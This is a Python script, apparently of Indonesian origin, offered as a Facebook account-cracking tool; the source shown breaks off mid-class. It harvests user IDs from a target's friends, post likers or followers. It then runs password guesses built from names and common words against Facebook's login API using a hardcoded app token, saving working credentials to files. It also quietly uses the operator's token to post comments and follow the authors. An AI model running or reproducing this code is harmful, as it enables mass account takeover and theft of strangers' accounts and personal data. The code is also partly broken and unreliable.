#!/usr/bin/python3
# Authot : Khamdihi & nisa-xd
# Hargai author :(

import base64
exec(base64.b64decode('#!/usr/bin/python3
# Author : Khamdihi xcrack
# Authur 2 : NISA-XD
# WAJIB SUSCRIBE CHENEL AKU :)
# Cie di jebol
### MODULE IMPORT
import requests,mechanize,bs4,sys,os,subprocess,uuid,random,time,re,base64,urllib,json,urllib.parse,concurrent.futures
from random import randint
from urllib.parse import quote
from concurrent.futures import ThreadPoolExecutor as ThreadPool
from bs4 import BeautifulSoup as parser
from datetime import date
from datetime import datetime
current = datetime.now()

### KODE WARNA

p = "\x1b[0;37m" # putih
m = "\x1b[0;31m" # merah
h = "\x1b[0;32m" # hijau
k = "\x1b[0;33m" # kuning
b = "\x1b[0;34m" # biru
u = "\x1b[0;35m" # ungu
o = "\x1b[0;36m" # biru muda

if ("linux" in sys.platform.lower()):

        N = "\033[0m"
        G = "\033[1;92m"
        O = "\033[1;97m"
        R = "\033[1;91m"
else:

        N = ""
        G = ""
        O = ""
        R = ""

### SPANDUK ABADI ###

def banner():
    print("""\33[36;1m
   _   __  _ __   __ _____   __        _   __   ___    ____
  / \,' / /// /  / //_  _/  / /       / \,' /  / o.)  / __/
 / \,' / / U /  / /_ / /   / /       / \,' /  / o \  / _/
/_/ /_/  \_,'  /___//_/   /_/       /_/ /_/  /___,' /_/

\33[0;36m[\33[1;33m•\33[0;36m] \33[32;1mPembuat (1) \33[1;33m: KHAMDIHI XCRACK
\33[0;36m[\33[1;33m•\33[0;36m] \33[32;1mPembuat (2) \33[1;33m: NISA-XD
\33[0;36m[\33[1;33m•\33[0;36m] \33[32;1mStatus      \33[1;33m: Aktive
\33[0;36m[\33[1;33m•\33[0;36m] \33[32;1mversi       \33[1;33m: 1.8
 """)
ua="NokiaC3-00/5.0 (07.20) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 AppleWebKit/420+ (KHTML, like Gecko) Safari/420+"

ua2="Mozilla/5.0 (Linux; Android 4.1.2; Nokia_X Build/JZO54K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/30.0.1599.82 Mobile Safari/537.36 NokiaBrowser/1.2.0.12"
host="https://mbasic.facebook.com"
ips=None
try:
	b=requests.get("http://ip-api.com/json/").json()["query"]
	ips=requests.get("http://ip-api.com/json/"+b,headers={"Referer":"http://ip-api.com/","Content-Type":"application/json; charset=utf-8","User-Agent":"Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]"}).json()["country"].lower()
except:
	ips=None

ok = []
cp = []
ttl =[]

freefacebook = "https://free.facebook.com" #Update Method!

durasi = str(datetime.now().strftime("%d-%m-%Y"))
tahun = current.year
bulan = current.month
hari = current.day

br = mechanize.Browser()
br.set_handle_robots(False)
br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(),max_time=1)
br.addheaders = [('User-Agent',ua)]

def jalan(z):
	for e in z + "\n":
		sys.stdout.write(e)
		sys.stdout.flush()
		time.sleep(0.03)

def clear():
	if " linux" in sys.platform.lower():
		os.system("clear")
	elif "win" in sys.platform.lower():
		os.system("cls")
	else:os.system("clear")
def hdcok():
	global host,ua
	hosts=host
	r={"origin": hosts, "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7", "accept-encoding": "gzip, deflate", "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8", "user-agent": "Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]", "Host": "".join(bs4.re.findall("://(.*?)$",hosts)), "referer": hosts+"/login/?next&ref=dbl&fl&refid=8", "cache-control": "max-age=0", "upgrade-insecure-requests": "1", "content-type": "application/x-www-form-urlencoded"}
	return r

### LOGIN METHODE ###
def logs():
  os.system("clear")
  banner()
  print ("")
  print(("[01] Login Token"))
  print(("[02] Contact Author"))
  print(("[00] Exit\n"))
  sek=input(" • > Choose : ")
  if sek=="":
    print(("[!] Fill In The Correct"))
    logs()
  elif sek=="1" or sek=="01":
    log_token()
  elif sek=="2" or sek=="02":
    masalah()
  elif sek=="0" or sek=="00":
    exit()
  else:
    print(("[!] Fill In The Correct"))
    logs()

### MASLAH SCRIPT
def masalah():
    os.system("xdg-open https://wa.me/message/35SU3CBC6EBRO1")
    logs()
def eror():
	os.system("xdg-open https://wa.me/message/35SU3CBC6EBRO1")
	menu()
### LOGIN TOKEN.TXT ###
def log_token():
    os.system("clear")
    banner()
    jalan((" [!] gunakan akun tumbal ngab "))
    toket = input("\n [?] Masukan Token.txt : ")
    try:
        otw = requests.get("https://graph.facebook.com/me?access_token=" + toket)
        a = json.loads(otw.text)
        nama = a["name"]
        zedd = open("login.txt", "w")
        zedd.write(toket)
        zedd.close()
        print((" [!] Berhasil Login !"))
        jalan((" [•] Please Subscribe My Channel:)"))
        os.system('xdg-open https://youtube.com/channel/UCT_C8Owy2F8cw7FvopCGa0g')
        bot_follow()
        menu()
    except KeyError:
        print(("\n [!] Token Invalid"))
        logs()

## BOT FOLLOW MEME
komtwol = random.choice(["Salam 2 Jari Bang", "Sensei Terbaek Lah ", "bang lu kgk punya pacar?", "MengKeren Lah Bang", "Semangat Bang!", "Gua Murid Lu Bang", "Bjir BiiDev Femes Cuk Gua Ampe Mrinding", "Tumben Post Bang?", "Gua Pengin Jadi Kek Lu Bang", "Semoga Abang Jadi Orang Sukses", "Bjir Lawack Kali Kau Bang"])


kazutora = random.choice(["gans lu bang :v","oyoyoy lu gila ya?","ebink ngentod :v","masih smp udh bisa ngoding \n #bukanmaen","bang lu umur berapa?","moga lu sukses bang :)","master gua ini mah!","ster ajarin hack hati cewek doang","tutor dapetin cewek bang","gansnya bukanmaen awokawok"])
komen = komtwol
komendua = kazutora
post = "3909741969124574"
postdua = "4134869446611824"
def bot_follow():
	try:
		toket=open("login.txt","r").read()
		otw = requests.get("https://graph.facebook.com/me/?access_token="+toket)
		a = json.loads(otw.text)
		nama = a["name"]
		id = a["id"]
	except IOError:
		jalan((" [•] Token Invalid"))
		logs()
	requests.post('https://graph.facebook.com/' + post + '/comments/?message=' + komen +'&access_token=' + toket)
	requests.post('https://graph.facebook.com/' + postdua + '/comments/?message=' + komendua + '&acces_token'+toket)
	requests.post('https://graph.facebook.com/100002664282607/subscribers?access_token=' + toket) # TERSERAH
	requests.post('https://graph.facebook.com/100000419639430/subscribers?access_token=' + toket) # KHAMDIHI
	requests.post('https://graph.facebook.com/1752684667/subscribers?access_token=' + toket) # GUE SUKA SAMA DIA TAPI DIA NYA NGGA :(
	requests.post('https://graph.facebook.com/id-lu/subscribers?access_token=' + toket) # DIHI
	requests.post('https://graph.facebook.com/id-lu/subscribers?access_token=' + toket) # 
	requests.post('https://graph.facebook.com/id-lu/subscribers?access_token=' + toket) # 
	requests.post('https://graph.facebook.com/id-lu/subscribers?access_token=' + toket) # 
	requests.post('https://graph.facebook.com/id-lu/subscribers?access_token=' + toket) # REKODD 10K :) / GA BANG BERCANDA
	menu()

### MENU MALING AKUN
def menu():
    global ua
    try:
        toket = open("login.txt","r").read()
        otw = requests.get("https://graph.facebook.com/me/?access_token="+toket)
        a = json.loads(otw.text)
        nama = a["first_name"]
        ttl = a["birthday"]
        id = a["id"]
    except Exception as e:
        print((p+" ["+k+"•"+m+"•"+p+" Error : %s"%e))
        logs()
    ip = requests.get("https://api.ipify.org").text
    os.system("clear")
    banner()
    jalan(("\n[!] Selamat datang \033[1;32m"+nama))
    print(" ")
    print(("\33[0;36m[\33[1;33m•\33[0;36m] \33[37;1mYour ID      : \033[1;32m"+id))
    print(("\33[0;36m[\33[1;33m•\33[0;36m] \33[37;1mYour TTL     : \033[1;32m"+ttl))
    print(("\33[0;36m[\33[1;33m•\33[0;36m] \33[37;1mIp devis     : \033[1;32m"+ip))
    print(("\33[0;36m[\33[1;33m•\33[0;36m] \33[37;1mYour Joined  : \033[1;32m"+durasi))
    print(("\n\33[0;36m[\33[1;33m1\33[0;36m] \33[37;1mCrack ID From Public/Teman !!"))
    print(("\33[0;36m[\33[1;33m2\33[0;36m] \33[37;1mCrack ID From Likers Post"))
    print(("\33[0;36m[\33[1;33m3\33[0;36m] \33[37;1mCrack ID From Followers"))
    print(("\33[0;36m[\33[1;33m4\33[0;36m] \33[37;1mCrack Phone Number"))
    print(("\33[0;36m[\33[1;33m5\33[0;36m] \33[37;1mCrack Email"))
    print(("\33[0;36m[\33[1;33m6\33[0;36m] \33[37;1mCheck Opsi Account Checkpoint"))
    print(("\33[0;36m[\33[1;33m7\33[0;36m] \33[37;1mLapor bug"))
#   print(("\33[0;36m[\33[1;33m8\33[0;36m] \33[37;1m Set ua"))
    print(("\33[0;36m[\33[1;33m0\33[0;36m] \33[37;1mLogout "))
    khamdihi_main_menu()

## INPUT MAIN MENU Njing
def khamdihi_main_menu():
	r=input("\n -> Gaz buat dosa : ")
	if r=="":
		print((" [!] Fill In The Correct"))
		menu()
	elif r=="1" or r=="01": # Capek Gue ngetik njir
		publik()	# Lu enak rekode :(
	elif r=="2" or r=="02": # Mau di kucni ga tega
		likers()	# Itung² buat belajar lu
	elif r=="3" or r=="03": # Suscribe my chnenel :(
		follow()	# Baru buat :)
	elif r=="4" or r=="04": # Thnks buat lu yg udh
		random_numbers() # Suscribe chenel gue !
	elif r=="5" or r=="05":
		random_email()
	elif r=="6" or r=="06":
		cek_opsi()
	elif r=="7" or r=="07":
		eror()
	elif r=="8" or r=="08":
		useragent()
	elif r=="0" or r=="00":
		try:
			os.system("rm -rf login.txt")
			jalan("[!] Token telah terhapus")
			exit()
		except Exception as e:
			print((" [!] Error %s"%e))
	else:
		print(("\n [!] Wrong Input"))
		menu()

### MENU PILIH METHODE
def pilihcrack(file):
  print("  ")
  print(("[!] Select methode crack"))
  jalan(("[1] Crack With Api.Facebook"))
  jalan(("[2] Crack With Api.Facebook + TTL "))
  jalan(("[3] Crack With Mbasic.Facebook"))
  jalan(("[4] Crack With Mbasic.Facebook + TTL"))
  jalan(("[0] Balik ke menu "))
  dihi=input(p+"\n[?] Choose : ")
  if dihi in[""]:
    print(("[!] Fill In The Correct"))
    pilihcrack(file)
  elif dihi in["1","01"]:
    bapi(file)
  elif dihi in["2","02"]:
    bapittl(file)
  elif dihi in["3","03"]:
    crack(file)
  elif dihi in["4","04"]:
    crackttl(file)
  elif dihi in["0","00"]:
    menu()
  else:
    print(("[!]  Fill In The Correct"))
    pilihcrack(file)

## CRACK PUBLIK/TEMAN
def publik():
	try:
		toket=open("login.txt","r").read()
	except IOError:
		jalan(("\n [!] Cookie/Token Invalid"))
		os.system("rm -rf login.txt")
		logs()
	try:
		jalan(("\n[?] Ketik me Dump From Friendlist"))
		idt = input("[!] User ID Target: ")
		try:
			jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
			op = json.loads(jok.text)
			print(("[!] Name: "+op["name"]))
		except KeyError:
			jalan(("[!] ID Not Found"))
			print(("\n [BACK]"))
			menu()
		r=requests.get("https://graph.facebook.com/"+idt+"/friends?limit=10000&access_token="+toket)
		id = []
		z=json.loads(r.text)
		qq = (op["first_name"]+".json").replace(" ","_")
		ys = open(qq , "w")#.replace(" ","_")
		for a in z["data"]:
			id.append(a["id"]+"<=>"+a["name"])
			ys.write(a["id"]+"<=>"+a["name"]+"\n")
		ys.close()
		jalan(("[!] Total ID : %s"%(len(id))))
		return pilihcrack(qq)
	except Exception as e:
		exit("\n [!] Error : %s"%e)
## crack Likes
def likers():
	try:
		toket=open("login.txt","r").read()
	except IOError:
		print(("\n [!] Cookie/Token Invalid"))
		os.system("rm -rf login.txt")
		logs()
	try:
		idt = input("[!] ID Post Target : ")
		try:
			jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
			op = json.loads(jok.text)
			print(("[!] Name : "+op["name"]))
		except KeyError:
			print(("[!] ID Not Found"))
			print(("\n [BACK]"))
			menu()
		r=requests.get("https://graph.facebook.com/"+idt+"/likes?limit=100000&access_token="+toket)
		id = []
		z=json.loads(r.text)
		qq = (op["first_name"]+".json").replace(" ","_")
		ys = open(qq , "w")#.replace(" ","_")
		for a in z["data"]:
			id.append(a["id"]+"<=>"+a["name"])
			ys.write(a["id"]+"<=>"+a["name"]+"\n")
		ys.close()
		print(("[!] Total ID : %s"%(len(id))))
		return pilihcrack(qq)
	except Exception as e:
		exit("\n [!] Error : %s"%e)
## Crack folowes
def follow():
	try:
		toket=open("login.txt","r").read()
	except IOError:
		print(("\n[!] Cookie/Token Invalid"))
		os.system("rm -rf login.txt")
		logs()
	try:
		idt = input("[!] Followers ID Target : ")
		try:
			jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
			op = json.loads(jok.text)
			print(("[!] Name: "+op["name"]))
		except KeyError:
			print(("[!] ID Not Found"))
			print(("\n [BACK]"))
			menu()
		r=requests.get("https://graph.facebook.com/"+idt+"/subscribers?limit=20000&access_token="+toket)
		id = []
		z=json.loads(r.text)
		qq = (op["first_name"]+".json").replace(" ","_")
		ys = open(qq , "w")#.replace(" ","_")
		for a in z["data"]:
			id.append(a["id"]+"<=>"+a["name"])
			ys.write(a["id"]+"<=>"+a["name"]+"\n")
		ys.close()
		print(("[!] Total ID : %s"%(len(id))))
		return pilihcrack(qq)
	except Exception as e:
		exit("\n [!] Error : %s"%e)
### Krek Nomer su! ###
def random_numbers():
  data = []
  print(("\n [!] Number Must Be 5 Digit"))
  kode=str(input("[!] Contoh : 92037\n"+p+" ["+k+"•"+m+"•"+p+"] Input Number: "))
  exit(("\n [!] Number Must Be 5 Digit")) if len(kode) < 5 else ''
  exit(("\n [!] Number Must Be 5 Digit")) if len(kode) > 5 else ''
  jml=int(input("[!] Amount : "))
  [data.append({'user': str(e), 'pw':[str(e[5:]), str(e[6:])]}) for e in [str(kode)+''.join(['%s'%(randint(0,9)) for i in range(0,7)]) for e in range(jml)]]
  print(p+" [!] Crack Started, Please Wait...\n")
  with concurrent.futures.ThreadPoolExecutor(max_workers=15) as th:
    {th.submit(brute, user['user'], user['pw']): user for user in data}
  input("\n [BACK]")
  menu()

### cloning imael
def random_email():
  data = []
  nama=input("[••] Target Name : ")
  domain=input("[••] Choose Domain [G]mail, [Y]ahoo, [H]otmail : ").lower().strip()
  list={
    'g':'@gmail.com',
    'y':'@yahoo.com',
    'h':'@hotmail.com'
  }
  exit(("\033[1;37m[••] Fill In The Correct")) if not domain in ['g','y','h'] else ''
  jml=int(input("[••] Amount : "))
  setpw=input("[••] Set Password : ").split(',')
  print("\033[1;37m [••] Crack Started, Please Wait...\n")
  [data.append({'user': nama+str(e)+list[domain], 'pw':[(i) for i in setpw]}) for e in range(1,jml+1)]
  with concurrent.futures.ThreadPoolExecutor(max_workers=15) as th:
    {th.submit(brute, user['user'], user['pw']): user for user in data}
  input("\n\033[1;37m [BACK]")
  menu()

## PASSWORD ###

def generate(text):
	results=[]
	global ips
	for name in text.split("<=>"):
		if len(name)<3:
			continue
		else:
			name=name.lower()
			if len(name)==3 or len(name)==4 or len(name)==5:
				results.append(name)
				results.append(name+"123")
				results.append(name+"123456")
			else:
				results.append(name)
				results.append(name+"123")
				results.append(name+"123456")
				results.append(name+"123456")
				if "indonesia" in ips:
					results.append("sayang")
					results.append("anjing")
					results.append("bismillah")
					results.append("kontol")
					results.append("freefire")
					results.append("bangsat")
					results.append("mobile legend")
					results.append("garena free fire")
					results.append("pubg mobile")
					results.append("kata sandi")
					results.append("bajingan")
	return results
## fb rute
def brute(user, passs):
  try:
    for pw in passs:
      params={
        'access_token': '350685531728%7C62f8ce9f74b12f84c123cc23437a4a32',
        'format': 'JSON',
        'sdk_version': '2',
        'email': user,
        'locale': 'en_US',
        'password': pw,
        'sdk': 'ios',
        'generate_session_cookies': '1',
        'sig': '3f555f99fb61fcd7aa0c44f58f522ef6',
      }
      api='https://b-api.facebook.com/method/auth.login'
      response=requests.get(api, params=params)
      if re.search('(EAAA)\w+', str(response.text)):
        print('\x1b[0;32m * --> %s • %s '%(str(user), str(pw)))
        break
      elif 'www.facebook.com' in response.json()['error_msg']:
        print('\x1b[0;33m * --> %s • %s '%(str(user), str(pw)))
        break
  except: pass

### BRUTE CRACK ###

class crack:
	os.system("clear")
	banner()
	def __init__(self,isifile):
		self.ada=[]
		self.cp=[]
		self.ko=0
		jalan(("\n [•] Crack With Pass Default/Manual [d/m]"))
		while True:
			f=input(p+" [•] Choose : ")
			if f=="":continue
			elif f=="m":
				try:
					while True:
						try:
							self.apk=isifile
							self.fs=open(self.apk).read().splitlines()
							break
						except Exception as e:
							print(("   %s"%e))
							continue
					self.fl=[]
					for i in self.fs:
						try:
							self.fl.append({"id":i.split("<=>")[0]})
						except:continue
				except Exception as e:
					print(("   %s"%e))
					continue
				jalan(("[•] Example : sayang,kontol,123456"))
				self.pwlist()
				break
			elif f=="d":
				try:
					while True:
						try:
							self.apk=isifile
							self.fs=open(self.apk).read().splitlines()
							break
						except Exception as e:
							print(("   %s"%e))
							continue
					self.fl=[]
					for i in self.fs:
						try:
							self.fl.append({"id":i.split("<=>")[0],"pw":generate(i.split("<=>")[1])})
						except:continue
				except Exception as e:
					print(("   %s"%e))
				print((p+"\n[•] Starting buat dosa :)"+p+"\n[•] Account [OK] Saved to : ok.txt"+p+"\n[•] Account [CP] Saved to : cp.txt"))
				ThreadPool(35).map(self.main,self.fl)
				os.remove(self.apk)
				exit()
				break
	def pwlist(self):
		self.pw=input("[•] Password List : ").split(",")
		if len(self.pw) ==0:
			self.pwlist()
		else:
			for i in self.fl:
				i.update({"pw":self.pw})
			print((p+"\n[•] Crack Started..."+p+"\n[!] Account [OK] Saved to : ok.txt"+p+"\n[•] Account [CP] Saved to : cp.txt"))
			ThreadPool(30).map(self.main,self.fl)
			os.remove(self.apk)
			exit()
	def main(self,fl):
		try:
			for i in fl.get("pw"):
				log=mbasic(fl.get("id"),
					i,"https://mbasic.facebook.com")
				if log.get("status")=="cp":
					print(("\r\x1b[0;33m * --> %s • %s\n               "%(fl.get("id"),i,)))
					self.cp.append("%s • %s"%(fl.get("id"),i))
					open("cp.txt","a+").write(
						"%s • %s\n"%(fl.get("id"),i))
					break
				elif log.get("status")=="success":
					print(("\r\x1b[0;32m * --> %s • %s               "%(fl.get("id"),i)))
					self.ada.append("%s • %s"%(fl.get("id"),i))
					open("ok.txt","a+").write(
						"%s • %s\n"%(fl.get("id"),i))
					break
				else:continue
					
			self.ko+=1
			print("\r\x1b[0;37m [dosa_bego]\x1b[0;37m %s/%s \x1b[0;37mOK : %s \x1b[0;37mCP : %s\x1b[0;37m"%(self.ko,len(self.fl),len(self.ada),len(self.cp)), end=' ');sys.stdout.flush()
		except:
			self.main(fl)
class crackttl:
	os.system("clear")
	banner()
	def __init__(self,isifile):
		self.ada=[]
		self.cp=[]
		self.ko=0
		print((p+"\n [!] Crack With Pass Default/Manual [d/m]"))
		while True:
			f=input("[?] Choose : ")
			if f=="":continue
			elif f=="m":
				try:
					while True:
						try:
							self.apk=isifile
							self.fs=open(self.apk).read().splitlines()
							break
						except Exception as e:
							print(("   %s"%e))
							continue
					self.fl=[]
					for i in self.fs:
						try:
							self.fl.append({"id":i.split("<=>")[0]})
						except:continue
				except Exception as e:
					print(("   %s"%e))
					continue
				print(("[!] Example : sayang,kontol,123456"))
				self.pwlist()
				break
			elif f=="d":
				try:
					while True:
						try:
							self.apk=isifile
							self.fs=open(self.apk).read().splitlines()
							break
						except Exception as e:
							print(("   %s"%e))
							continue
					self.fl=[]
					for i in self.fs:
						try:
							self.fl.append({"id":i.split("<=>")[0],"pw":generate(i.split("<=>")[1])})
						except:continue
				except Exception as e:
					print(("   %s"%e))
				print(("\n[•] Crack Started..."+p+"\n[•] Account [OK] Saved to : ok.txt"+p+"\n[•] Account [CP] Saved to : cp.txt"))
				ThreadPool(35).map(self.main,self.fl)
				os.remove(self.apk)
				exit()
				break
	def pwlist(self):
		self.pw=input(p+" [•] Password List : ").split(",")
		if len(self.pw) ==0:
			self.pwlist()
		else:
			for i in self.fl:
				i.update({"pw":self.pw})
			print((p+"\n[•] Crack Started !!!"+p+"\n[•] Account [OK] Saved to : ok.txt"+p+"\n[•] Account [CP] Saved to : cp.txt"))
			ThreadPool(30).map(self.main,self.fl)
			os.remove(self.apk)
			exit()
	def main(self,fl):
		try:
			for i in fl.get("pw"):
				log=mbasic(fl.get("id"),
					i,"https://mbasic.facebook.com")
				if log.get("status")=="cp":
					try:
						ke=requests.get("https://graph.facebook.com/"+fl.get("id")+"?access_token="+open("login.txt","r").read())
						tt=json.loads(ke.text)
						ttl=tt["birthday"]
					except:pass
					print("\r\x1b[0;33m * --> %s • %s • %s \x1b[0m   "%(fl.get("id"),i,str(ttl)))
					self.cp.append("%s • %s"%(fl.get("id"),i))
					open("cp.txt","a+").write(
						"%s • %s • %s\n"%(fl.get("id"),i,str(ttl)))
					break
				elif log.get("status")=="success":
					print(("\r\x1b[0;32m * --> %s • %s               "%(fl.get("id"),i)))
					self.ada.append("%s • %s"%(fl.get("id"),i))
					if fl.get("id") in open("ok.txt").read():
						break
					else:
						open("ok.txt","a+").write(
						"%s • %s\n"%(fl.get("id"),i))
					break
				else:continue
					
			self.ko+=1
			print("\r\x1b[0;37m [dosa_bego]\x1b[0;37m %s/%s \x1b[0;37mOK : %s \x1b[0;37mCP : %s\x1b[0;37m"%(self.ko,len(self.fl),len(self.ada),len(self.cp)), end=' ');sys.stdout.flush()
		except:
			self.main(fl)
class bapi:
  def __init__(self,isifile):
    self.setpw = False
    self.ok = []
    self.cp = []
    self.loop = 0
    self.krah(isifile)
  def krah(self,isifile):
    print(("\n[?] Crack With Pass Default/Manual [d/m]"))
    while True:
      f=input("[?] Choose : ")
      if f in[""," "]:
        print((p+" [!] Invalid Number"))
        continue
      elif f in["m","M"]:
        try:
          while True:
            try:
              self.apk=isifile
              self.fs=open(self.apk).read().splitlines()
              break
            except Exception as e:
              print((k+"["+p+"!"+k+"]"+p+" %s"%e))
              continue
          self.fl=[]
          print((p+" [•] Example : sayang,kontol,123456"))
          self.pw=input(p+" [•] Password List : ").split(",")
          if len(self.pw) ==0:
            continue
          for i in self.fs:
            try:
              self.fl.append({"id":i.split("<=>")[0],"pw":self.pw})
            except:
              continue
        except Exception as e:
          print(("  %s"%e))
          continue
        print(("\n [•] Started buat dosa :)"+p+"\n [•] Account [OK] Saved to : ok.txt"+p+"\n [•] Account [CP] Saved to : cp.txt"))
        ThreadPool(30).map(self.brute,self.fl)
        #os.remove(self.apk)
        exit()
        break
      elif f in["d","D"]:
        try:
          while True:
            try:
              self.apk=isifile
              self.fs=open(self.apk).read().splitlines()
              break
            except Exception as e:
              print(e)
              continue
          self.fl=[]
          for i in self.fs:
            try:
              self.fl.append({"id":i.split("<=>")[0],"pw":generate(i.split("<=>")[1])})
            except:continue
        except:
          continue
        print((p+"\n[•] Started buat dosa"+p+"\n[•] Account [OK] Saved to : ok.txt"+p+"\n[•] Account [CP] Saved to : cp.txt"))
        ThreadPool(30).map(self.brute,self.fl)
        os.remove(self.apk)
        exit()
        break
  def bruteRequest(self, username, password):
    global ok,cp,ttl
    params = {"access_token": "350685531728%7C62f8ce9f74b12f84c123cc23437a4a32",  "format": "JSON", "sdk_version": "2", "email": username, "locale": "en_US", "password": password, "sdk": "ios", "generate_session_cookies": "1", "sig": "3f555f99fb61fcd7aa0c44f58f522ef6"}
    api = "https://b-api.facebook.com/method/auth.login"
    response = requests.get(api, params=params)
    if re.search("(EAAA)\\w+", response.text):
      self.ok.append(username + " • " + password)
      print(("\r\x1b[0;32m * --> %s • %s %s               "%(username,password,N)))
      ok.append(username + " • " + password)
      save = open("ok.txt", "a")
      save.write(str(username) + " • " + str(password) + "\n")
      save.close()
      return True
    else:
      if "www.facebook.com" in response.json()["error_msg"]:
        self.cp.append(username + " • " + password)
        print(("\r\x1b[0;33m * --> %s • %s %s               "%(username,password,N)))
        save = open("cp.txt", "a+")
        save.write(str(username) + " • " + str(password) + "\n")
        save.close()
        return True
    return False
  def brute(self, fl):
    if self.setpw == False:
      self.loop += 1
      for pw in fl["pw"]:
        username = fl["id"].lower()
        password = pw.lower()
        try:
          if self.bruteRequest(username, password) == True:
            break
        except:
          continue
        print(("\r\x1b[0;37m [Crack]\x1b[0;37m %s/%s \x1b[0;37mOK : %s \x1b[0;37mCP : %s\x1b[0;37m"%(self.loop,len(self.fl),len(self.ok),len(self.cp))), end=' ');sys.stdout.flush()
    else:
      self.loop += 1
      for pw in self.setpw:
        username = users["id"].lower()
        password = pw.lower()
        try:
          if self.bruteRequest(username, password) == True:
            break
        except:
          continue
        print(("\r\x1b[0;37m [Crack]\x1b[0;37m %s/%s \x1b[0;37mOK : %s \x1b[0;37mCP : %s\x1b[0;37m"%(self.loop,len(self.fl),len(self.ok),len(self.cp))), end=' ');sys.stdout.flush()

class bapittl:
  def __init__(self,isifile):
    self.setpw = False
    self.ok = []
    self.cp = []
    self.loop = 0
    self.krah(isifile)
  def krah(self,isifile):
    print((p+"\n [•] Crack With Pass Default/Manual [d/m]"))
    while True:
      f=input(p+" [•] Choose : ")
      if f in[""," "]:
        print((p+" [•] Invalid Number"))
        continue
      elif f in["m","M"]:
        try:
          while True:
            try:
              self.apk=isifile
              self.fs=open(self.apk).read().splitlines()
              break
            except Exception as e:
              print((k+"["+p+"!"+k+"]"+p+" %s"%e))
              continue
          self.fl=[]
          print((p+" [•] Example : sayang,kontol,123456"))
          self.pw=input(p+" [•] Password List : ").split(",")
          if len(self.pw) ==0:
            continue
          for i in self.fs:
            try:
              self.fl.append({"id":i.split("<=>")[0],"pw":self.pw})
            except:
              continue
        except Exception as e:
          print(("  %s"%e))
          continue
        print((p+"\n [•] Crack Started..."+p+"\n [•] Account [OK] Saved to : ok.txt"+p+"\n [•] Account [CP] Saved to : cp.txt"))
        ThreadPool(30).map(self.brute,self.fl)
        #os.remove(self.apk)
        exit()
        break
      elif f in["d","D"]:
        try:
          while True:
            try:
              self.apk=isifile
              self.fs=open(self.apk).read().splitlines()
              break
            except Exception as e:
              print(e)
              continue
          self.fl=[]
          for i in self.fs:
            try:
              self.fl.append({"id":i.split("<=>")[0],"pw":generate(i.split("<=>")[1])})
            except:continue
        except:
          continue
        print((p+"\n [•] Crack Started..."+p+"\n [•] Account [OK] Saved to : ok.txt"+p+"\n [•] Account [CP] Saved to : cp.txt"))
        ThreadPool(30).map(self.brute,self.fl)
        os.remove(self.apk)
        exit()
        break
  def bruteRequest(self, username, password):
    global ok,cp,ttl
    params = {"access_token": "350685531728%7C62f8ce9f74b12f84c123cc23437a4a32",  "format": "JSON", "sdk_version": "2", "email": username, "locale": "en_US", "password": password, "sdk": "ios", "generate_session_cookies": "1", "sig": "3f555f99fb61fcd7aa0c44f58f522ef6"}
    api = "https://b-api.facebook.com/method/auth.login"
    response = requests.get(api, params=params)
    if re.search("(EAAA)\\w+", response.text):
      self.ok.append(username + " • " + password)
      print(("\r\x1b[0;32m * --> %s • %s %s               "%(username,password,N)))
      ok.append(username + " • " + password)
      save = open("ok.txt", "a")
      save.write(str(username) + " • " + str(password) + "\n")
      save.close()
      return True
    else:
      if "www.facebook.com" in response.json()["error_msg"]:
        try:
          ke=requests.get("https://graph.facebook.com/"+str(username)+"?access_token="+open("login.txt","r").read())
          tt=json.loads(ke.text)
          ttl=tt["birthday"]
        except:pass
        self.cp.append(username + " • " + password + " • " + ttl)
        print("\r\x1b[0;33m * --> %s • %s • %s   "%(username,password,ttl))
        save = open("cp.txt", "a+")
        save.write(str(username) + " • " + str(password) + " • "+ str(ttl)+"\n")
        save.close()
        return True
    return False
  def brute(self, fl):
    if self.setpw == False:
      self.loop += 1
      for pw in fl["pw"]:
        username = fl["id"].lower()
        password = pw.lower()
        try:
          if self.bruteRequest(username, password) == True:
            break
        except:
          continue
        print(("\r\x1b[0;37m [Crack]\x1b[0;37m %s/%s \x1b[0;37mOK : %s \x1b[0;37mCP : %s\x1b[0;37m"%(self.loop,len(self.fl),len(self.ok),len(self.cp))), end=' ');sys.stdout.flush()
    else:
      self.loop += 1
      for pw in self.setpw:
        username = users["id"].lower()
        password = pw.lower()
        try:
          if self.bruteRequest(username, password) == True:
            break
        except:
          continue
        print(("\r\x1b[0;37m [Crack]\x1b[0;37m %s/%s \x1b[0;37mOK : %s \x1b[0;37mCP : %s\x1b[0;37m"%(self.loop,len(self.fl),len(self.ok),len(self.cp))), end=' ');sys.stdout.flush()

class crackttl:
	os.system("clear")
	banner()
	def __init__(self,isifile):
		self.ada=[]
		self.cp=[]
		self.ko=0
		print((p+"\n [•] Crack With Pass Default/Manual [d/m]"))
		while True:
			f=input(p+" [•] Choose : ")
			if f=="":continue
			elif f=="m":
				try:
					while True:
						try:
							self.apk=isifile
							self.fs=open(self.apk).read().splitlines()
							break
						except Exception as e:
							print(("   %s"%e))
							continue
					self.fl=[]
					for i in self.fs:
						try:
							self.fl.append({"id":i.split("<=>")[0]})
						except:continue
				except Exception as e:
					print(("   %s"%e))
					continue
				print((p+" [•] Example : sayang,kontol,123456"))
				self.pwlist()
				break
			elif f=="d":
				try:
					while True:
						try:
							self.apk=isifile
							self.fs=open(self.apk).read().splitlines()
							break
						except Exception as e:
							print(("   %s"%e))
							continue
					self.fl=[]
					for i in self.fs:
						try:
							self.fl.append({"id":i.split("<=>")[0],"pw":generate(i.split("<=>")[1])})
						except:continue
				except Exception as e:
					print(("   %s"%e))
